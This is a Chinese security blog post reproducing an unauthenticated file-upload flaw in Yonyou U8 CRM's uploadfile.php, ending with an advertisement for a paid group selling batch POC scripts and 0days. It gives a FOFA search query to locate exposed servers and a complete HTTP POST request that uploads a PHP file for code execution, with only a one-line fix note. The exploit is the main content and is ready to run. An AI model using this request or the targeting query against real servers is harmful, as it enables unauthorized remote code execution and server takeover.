#  「漏洞复现」用友U8 CRM uploadfile 文件上传漏洞   
冷漠安全  冷漠安全   2024-05-29 21:42  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
用友U8 CRM客户关系管理系统是一款专业的企业级CRM软件，旨在帮助企业高效管理客户关系、提升销售业绩和提供优质的客户服务  
。  
  
0x03  
  
**漏洞威胁**  
  
用友 U8 CRM客户关系管理系统 uploadfile.php 文件存在任意文件上传漏洞，未经身份验证的攻击者通过漏洞上传恶意后门文件，执行任意代码，从而获取到服务器权限。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
title="用友U8CRM"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pIIsicKqN6Rwws18C4JxWJHXFHVEicbrNm7I3GrWr6wYVYKcniaxPPgWyicjyeViacdvLGI28pB2npEIA/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
POC  
```
POST /ajax/uploadfile.php?DontCheckLogin=1&vname=file HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: multipart/form-data;boundary=----269520967239406871642430066855
 
------269520967239406871642430066855
Content-Disposition: form-data; name="file"; filename="1.php "
Content-Type: application/octet-stream
 
<?php print(111*222);unlink(__FILE__);?>
------269520967239406871642430066855
Content-Disposition: form-data; name="upload"
 
upload
------269520967239406871642430066855--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pIIsicKqN6Rwws18C4JxWJHHjkSXic7oHM6qdBlePPTnMQqkz5uzonQicFBQWYSjZN6UsARibqXConow/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pIIsicKqN6Rwws18C4JxWJHQ4evCZp5WCfibGtRSZ4A5LZaMDZFJHB4cgO9QHCuicQhicRu5Xeq5uPZA/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pIIsicKqN6Rwws18C4JxWJHiaXPHWlVgToNaG51Sjm4aK76z9CC2aU11X9TKxOQMUggyibyRPcHpEgg/640?wx_fmt=png&from=appmsg "")  
  
0x07  
  
**修复建议**  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pIIsicKqN6Rwws18C4JxWJHLs3UWgVmhYdmK6iagCjrAtXPcFxXQLOOlsibOib5orciahxU6aVHXqFKbA/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pIIsicKqN6Rwws18C4JxWJHeeicIjXgE68sIWOM333cEYtTyfrv1GdEOoFibZYgVUVOVNJrcVpg4yLA/640?wx_fmt=gif&from=appmsg "")  
  
  
